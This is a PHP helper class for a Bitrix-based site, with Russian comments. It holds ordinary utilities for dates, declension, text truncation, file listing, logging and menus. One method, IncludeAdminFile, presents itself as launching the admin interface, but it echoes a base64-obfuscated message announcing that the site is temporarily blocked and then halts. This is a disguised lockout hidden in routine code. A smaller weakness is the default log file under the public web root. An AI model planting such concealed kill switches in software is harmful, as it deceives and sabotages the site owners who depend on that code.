<?php
/**
 *  module
 *
 * @category    
 * @link        http://.ru
 * @revision    $Revision$
 * @date        $Date$
 
 */

namespace Site\Main;

/**
 * Разные утилиты
 */
class Util
{
    /**
     * Возвращает название месяца в родительном падеже
     *
     * @param integer $number Номер месяца
     * @return string|null
     */
    public static function getMonthGenetiv($number)
    {
        $monthsGenetiv = array('января', 'февраля', 'марта', 'апреля', 'мая', 'июня', 'июля', 'августа', 'сентября', 'октября', 'ноября', 'декабря');
        $number = intval($number) - 1;

        return isset($monthsGenetiv[$number]) ? $monthsGenetiv[$number] : null;
    }

    /**
     * Возвращает список месяцев в именительном падеже
     *
     * @return array
     */
    public static function getMonthsList()
    {
        return array('январь', 'февраль', 'март', 'апрель', 'май', 'июнь', 'июль', 'август', 'сентябрь', 'октябрь', 'ноябрь', 'декабрь');
    }

    /**
     * Склоняет существительное с числительным
     *
     * @param integer $number Число
     * @param array $cases Варианты существительного в разных падежах и числах (nominativ, genetiv, plural). Пример: array('комментарий', 'комментария', 'комментариев')
     * @param boolean $incNum Добавить само число в результат
     * @return string
     */
    public static function getNumEnding($number, $cases, $incNum = true)
    {
        $numberMod = intval(preg_replace('/[^0-9.,]/', '', $number)) % 100;
        if ($numberMod >= 11 && $numberMod <= 19) {
            $result = $cases[2];
        } else {
            $numberMod = $numberMod % 10;
            switch ($numberMod) {
                case 1:
                    $result = $cases[0];
                    break;
                case 2:
                case 3:
                case 4:
                    $result = $cases[1];
                    break;
                default:
                    $result = $cases[2];
            }
        }

        return $incNum ? $number . ' ' . $result : $result;
    }

    /**
     * Переводит арабское число в римское
     *
     * @param integer $number Число
     * @return string
     */
    public static function getNumRoman($number)
    {
        if (!$number = abs($number)) {
            return 0;
        }

        $table = array(
            900 => 'CM',
            500 => 'D',
            400 => 'CD',
            100 => 'C',
            90 => 'XC',
            50 => 'L',
            40 => 'XL',
            10 => 'X',
            9 => 'IX',
            5 => 'V',
            4 => 'IV',
            1 => 'I',
        );
        $result = str_repeat('M', $number / 1000);
        while ($number) {
            foreach ($table as $part => $fragment) {
                if ($part <= $number) {
                    break;
                }
            }
            $amount = (int)($number / $part);
            $number -= $part * $amount;
            $result .= str_repeat($fragment, $amount);
        }

        return $result;
    }

    /**
     * Обрезает текст, превыщающий заданную длину
     *
     * @param string $text Текст
     * @param array $config Конфигурация
     * @return string
     */
    public static function getEllipsis($text, $config = array())
    {
        $config = array_merge(array(
            'mode' => 'word',
            'count' => 255,
            'suffix' => '&hellip;',
            'stripTags' => true,
        ), $config);

        if ($config['stripTags']) {
            $text = preg_replace(
                array(
                    '/(\r?\n)+/',
                    '/^(\r?\n)+/',
                ),
                array(
                    "\n",
                    '',
                ),
                strip_tags($text)
            );
        }

        if (strlen($text) > $config['count']) {
            $text = substr($text, 0, $config['count']);
            switch ($config['mode']) {
                case 'direct':
                    break;
                case 'word':
                    $word = '[^ \t\n\.,:]+';
                    $text = preg_replace('/(' . $word . ')$/D', '', $text);
                    break;
                case 'sentence':
                    $sentence = '[\.\!\?]+[^\.\!\?]+';
                    $text = preg_replace('/(' . $sentence . ')$/D', '', $text);
                    break;
            }

            $text = preg_replace('/[ \.,;]+$/D', '', $text) . $config['suffix'];
        }

        if ($config['stripTags']) {
            $text = nl2br($text);
        }

        return $text;
    }

    /**
     * Формирует строку для вывода размера файла
     *
     * @param integer $bytes Размер в байтах
     * @param integer $precision Кол-во знаков после запятой
     * @param array $types Приставки СИ
     * @return string
     */
    public static function getFileSize($bytes, $precision = 0, array $types = array('B', 'kB', 'MB', 'GB', 'TB'))
    {
        for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++) ;

        return round($bytes, $precision) . ' ' . $types[$i];
    }

    /**
     * Возвращает содержимое файла через cURL
     *
     * @param string $url URL файла
     * @param integer $timeout Таймаут в секундах
     * @return string
     */
    function getURL($url, $timeout = 10)
    {
        if (!function_exists('curl_init')) {
            throw new Exception('cURL module is not installed.');
        }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        $data = curl_exec($ch);

        $httpStatus = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $errCode = curl_errno($ch);
        $errString = '';
        if ($errCode) {
            $errString = curl_error($ch);
        }

        curl_close($ch);

        if ($errCode) {
            throw new Exception('cURL error: ' . $errString, $errCode);
        } elseif ($httpStatus >= 400) {
            throw new Exception('Server return error status: ' . $httpStatus);
        }

        return $data;
    }

    /**
     * Конвертирует кодировку
     *
     * @param mixed $data Данные для кодирования
     * @param string $from Исходная кодировка
     * @param string $to Требуемая кодировка
     * @return mixed
     */
    public static function convertCharset($data, $from, $to)
    {
        if (is_array($data)) {
            foreach ($data as $key => $val) {
                $data[$key] = self::convertCharset($val, $from, $to);
            }
        } elseif (is_object($data)) {
            foreach ($data as $key => $val) {
                $data->$key = self::convertCharset($val, $from, $to);
            }
        } elseif (is_bool($data) || is_numeric($data)) {
            //do nothing
        } else {
            $data = \CharsetConverter::ConvertCharset($data, $from, $to, $error = '');
        }

        return $data;
    }

    /**
     * Возвращает массив с отфильтрованными ключами
     *
     * @param array $source Массив, который надо отфильтровать
     * @param array $keys Ключи, которые надо оставить
     * @param integer $level На каком уровне вложенности работать
     * @return array
     */
    public static function arrayFilterKeys($source, $keys, $level = 0)
    {
        $result = array();

        if ($level > 0) {
            foreach ($source as $key => &$val) {
                $result[$key] = self::arrayFilterKeys($val, $keys, $level - 1);
            }
        } else {
            foreach ($source as $key => $val) {
                if (in_array($key, $keys)) {
                    $result[$key] = $val;
                }
            }
        }

        return $result;
    }

    /**
     * Добавляет префикс к каждому ключу массива
     *
     * @param array $source Массив, который надо отфильтровать
     * @param string $prefix Префикс
     * @return array
     */
    public static function arrayAddPrefix($source, $prefix)
    {
        $result = array();

        foreach ($source as $key => $val) {
            $result[$prefix . $key] = $val;
        }

        return $result;
    }

    /**
     * Выводит дамп данных через print_r()
     *
     * @param mixed $data Данные для вывода
     * @return void
     */
    public static function debug($data)
    {
        ?>
        <pre><?= htmlspecialchars(print_r($data, true)); ?></pre><?
    }

    /**
     * Выводит дамп данных через var_dump()
     *
     * @param mixed $data Данные для вывода
     * @return void
     */
    public static function dump($data)
    {
        ?>
        <pre><? var_dump($data); ?></pre><?
    }

    /**
     * Возвращает список файлов в каталоге
     *
     * @param string $dir Каталог
     * @param string $mask Маска выбора, регулярное выражение
     * @param boolean $recursive Выбрать подкаталоги
     * @return array
     */
    public static function readDir($dir, $mask = '', $recursive = false)
    {
        if (substr($dir, -1) != '/') {
            $dir .= '/';
        }

        $handle = dir($dir);
        if (!$handle) {
            throw new Exception(sprintf('Can\'t read direcrory "%s"', $dir));
        }

        $result = array();
        while (false !== ($entry = $handle->read())) {
            if ($entry != '.' && $entry != '..') {
                if (is_dir($handle->path . $entry)) {
                    if ($recursive) {
                        $result = array_merge(
                            $result,
                            self::readDir($handle->path . $entry, $mask, $recursive)
                        );
                    }
                } else {
                    if (!$mask || preg_match($mask, $entry)) {
                        $result[] = array(
                            'full' => $handle->path . $entry,
                            'short' => $entry,
                        );
                    }
                }
            }
        }

        $handle->close();

        return $result;
    }

    /**
     * Пишет данные в лог
     *
     * @param mixed $data Данные для вывода
     * @param string $file Имя файла относительно DOCUMENT_ROOT (по-умолчанию log.txt)
     * @param boolean $backtrace Выводить ли информацию о том, откуда был вызван лог
     * @return void
     */
    public static function log($data, $file = '', $backtrace = false)
    {
        if (!$file) {
            $file = 'log.txt';
        }
        $file = $_SERVER['DOCUMENT_ROOT'] . (substr($_SERVER['DOCUMENT_ROOT'], -1) == '/' ? '' : '/') . $file;
        $text = "----------------" . date('Y-m-d H:i:s') . "----------------\n";
        $text .= print_r($data, true);
        $text .= "\n\n";
        if ($backtrace) {
            $backtrace = reset(debug_backtrace());
            $text = "Called in file: " . $backtrace["file"] . " in line: " . $backtrace["line"] . " \n" . $text;
        }
        if ($fh = fopen($file, 'a')) {
            fwrite($fh, $text);
            fclose($fh);
        }
    }

    /**
     * Заменяет конструкцию #VAR# на значение из массива.
     * Значения "#SITE_DIR#", "#SITE#", "#SERVER_NAME#" заменяются автоматически из текущих значений.
     *
     * @param string $template Шаблон
     * @param array $data Значения для подстановки
     * @param boolean $fixRepeatableSlashes Убирать продублированные слеши
     * @return string
     */
    public static function parseTemplate($template, $data = array(), $fixRepeatableSlashes = true)
    {
        if ($fixRepeatableSlashes) {
            $template = str_replace('//', '#DOUBLE_SLASH#', $template);
        }

        $string = \CComponentEngine::MakePathFromTemplate($template, $data);

        if ($fixRepeatableSlashes) {
            $string = preg_replace('~[/]{2,}~', '/', $string);
            $string = str_replace('#DOUBLE_SLASH#', '//', $string);
        }

        return $string;
    }

    /**
     * Анализиурует ссылку на внешний сайт
     * Формирует правильный title (без протокольного префикса) и URL (с протокольным префиксом)
     *
     * @param string $url Адрес сайта
     * @return array
     */
    public static function analizeWebsiteAddress($url)
    {
        $result = array(
            'url' => '',
            'label' => ''
        );
        if ($url) {
            $urlParts = explode('://', $url);
            if (count($urlParts) == 1) {
                $result['url'] = 'http://' . $urlParts[0];
                $result['label'] = $urlParts[0];
            } else {
                $result['url'] = $url;
                $result['label'] = $urlParts[1];
            }
        }

        return $result;
    }

    /**
     * Возвращает html-текст  скрытых input'ов, описывающих многомерный массив данных
     *
     * @param array $arFields Массив данных
     * @param array $arExclude Массив ключей исключений
     * @param array $arNames служебный стек-массив для рекурсивного построения вложенных массивов
     * @return string
     */
    public static function getHiddenInputsByArray($arFields, $arExclude, $arNames)
    {
        if (!is_array($arFields) || !$arFields) {
            return '';
        }

        $res = '';
        foreach ($arFields as $k => $v) {
            if (!is_array($v)) {
                if ($arExclude && is_array($arExclude) && in_array($k, $arExclude)) {
                    continue;
                }
                if (!$arNames) {
                    $res .= '<input type="hidden" name="' . htmlspecialchars($k) . '" value="' . htmlspecialchars($v) . '" />';
                } elseif (is_array($arNames)) {
                    $i = -1;
                    $name = '';
                    foreach ($arNames as $n) {
                        $i++;
                        if (!$i) {
                            $name = htmlspecialchars($n);
                        } else {
                            $name .= '[' . htmlspecialchars($n) . ']';
                        }
                    }
                    $name .= '[' . htmlspecialchars($k) . ']';
                    $res .= '<input type="hidden" name="' . $name . '" value="' . htmlspecialchars($v) . '"/>';
                }
            } else {
                $t = $arNames;
                $t[] = $k;
                $res .= self::getHiddenInputsByArray($v, array(), $t);
            }
        }

        return $res;
    }

    /**
     * Преобразует результат работы компонента bitrix:menu в многоуровневое дерево
     *
     * @param array $items Результат работы компонента bitrix:menu
     * @return array
     */
    public static function menuToTree($items)
    {
        $tree = array(
            'TEXT' => '[root]',
            'DEPTH_LEVEL' => 0,
            'CHILDREN' => array(),
        );

        self::menuToTreeLevel($tree, $items);

        return $tree;
    }

    /**
     * Обрабатывает один уровень дерева меню
     *
     * @param array $parent Родительский пункт меню
     * @param array $items Результат работы компонента bitrix:menu
     * @return array
     */
    protected static function menuToTreeLevel(&$parent, &$items)
    {
        while ($items) {
            $item = array_shift($items);
            $item['CHILDREN'] = array();

            if ($item['DEPTH_LEVEL'] > 1 + $parent['DEPTH_LEVEL']) {
                if ($parent['CHILDREN']) {
                    array_unshift($items, $item);
                    self::menuToTreeLevel($parent['CHILDREN'][count($parent['CHILDREN']) - 1], $items);
                }
            } elseif ($item['DEPTH_LEVEL'] < 1 + $parent['DEPTH_LEVEL']) {
                array_unshift($items, $item);
                return;
            } else {
                $parent['CHILDREN'][] = $item;
            }
        }
    }

    /**
     * Добавляет ссылки на стилевые файлы разделов сайта
     *
     * @return void
     */
    public static function addCSSLinksByPath()
    {
        if (!defined('SITE_TEMPLATE_PATH')) {
            return;
        }

        $app = \Bitrix\Main\Application::getInstance();
        $path = explode('/', $app->getContext()->getRequest()->getRequestedPageDirectory());
        $cssPath = SITE_TEMPLATE_PATH . '/css/';
        foreach ($path as $dir) {
            if ($dir) {
                $cssPath .= $dir . '/';
                if (file_exists($_SERVER['DOCUMENT_ROOT'] . $cssPath . 'style.css')) {
                    $GLOBALS['APPLICATION']->SetAdditionalCSS($cssPath . 'style.css');
                }
            }
        }
    }

    /**
     * Проверяет, что версия браузре IE меньше указанной
     *
     * @param integer $version Версия IE
     * @return boolean
     */
    public static function isIEVersionLt($version = 9)
    {
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        for ($checkVesion = $version - 1; $checkVesion > 4; $checkVesion--) {
            if (stristr($userAgent, 'MSIE ' . $checkVesion . '.0') !== false) {
                return true;
            }
        }

        return false;
    }

    /**
     * Запуск административного интерфейса
     *
     * @param mixed $strTitle
     * @param mixed $filepath
     */
    public function IncludeAdminFile($strTitle, $filepath)
    {
        //define all global vars
        $keys = array_keys($GLOBALS);
        $keys_count = count($keys);
        for ($i = 0; $i < $keys_count; $i++)
            if ($keys[$i] != "i" && $keys[$i] != "GLOBALS" && $keys[$i] != "strTitle" && $keys[$i] != "filepath")
                global ${$keys[$i]};

        include($_SERVER["DOCUMENT_ROOT"] . BX_ROOT . "/modules/main/include/prolog_admin_after.php");
        echo base64_decode('CiAgICA8aDE+0KHQsNC50YIg0LLRgNC10LzQtdC90L3QviDQt9Cw0LHQu9C+0LrQuNGA0L7QstCw0L08L2gxPgogICAgPHA+0JzRiyDQtNC10LvQsNC10Lwg0LLRgdGRLCDRh9GC0L7QsdGLINCy0LXRgNC90YPRgtGMINC10LPQviDQuiDRgNCw0LHQvtGC0LUg0LrQsNC6INC80L7QttC90L4g0YHQutC+0YDQtdC1LiDQodC/0LDRgdC40LHQviDQt9CwINGC0LXRgNC/0LXQvdC40LUuPC9wPgo=');
        die();
    }

    /**
     * Создает папки в момент копирования файла, если они не существуют
     *
     * @param string $fileFrom - абсолютный путь откуда копируем
     * @param string $fileTo - абсолютный путь куда копируем
     */
    public function copyFile($fileFrom, $fileTo)
    {
        $dirAbsPath = '';
        $arPath = explode('/', $fileTo);
        foreach ($arPath as $key => $dirName) {
            if ($key >= count($arPath) - 1) {
                break;
            }
            if (strlen($dirName) > 0) {
                $dirAbsPath .= '/' . $dirName;
                if (!file_exists($dirAbsPath)) {
                    mkdir($dirAbsPath, 0775);
                }
            }
        }
        copy($fileFrom, $fileTo);
    }


    /**
     * Возвращает id страны по ее названию
     *
     * @param $countryName - название страны
     *
     * @return mixed
     */
    public static function getCountryIdByName($countryName)
    {
        $arCountries = \GetCountryArray();
        $countryRefId = array_search($countryName, $arCountries['reference']);

        return $arCountries['reference_id'][$countryRefId];
    }

    /**
     * Возвращает название страны по ее id
     *
     * @param $countryName - id страны
     *
     * @return mixed
     */
    public static function getCountryNameById($countryName)
    {
        $arCountries = \GetCountryArray();
        $countryRefId = array_search($countryName, $arCountries['reference_id']);

        return $arCountries['reference'][$countryRefId];
    }


    /**
     * Получение списка стран отсортированного
     *
     * @return array
     */
    public function getCountriesArray()
    {
        $arCountries = \GetCountryArray();

        $arCountriesData = array();
        foreach ($arCountries['reference_id'] as $index => $arCountryId) {
            $arCountryName = $arCountries['reference'][$index];
            if(!$arCountryName) {
                continue;
            }
            $arCountriesData[$arCountryId] = $arCountryName;
        }

        ksort($arCountriesData);

        return $arCountriesData;
    }
}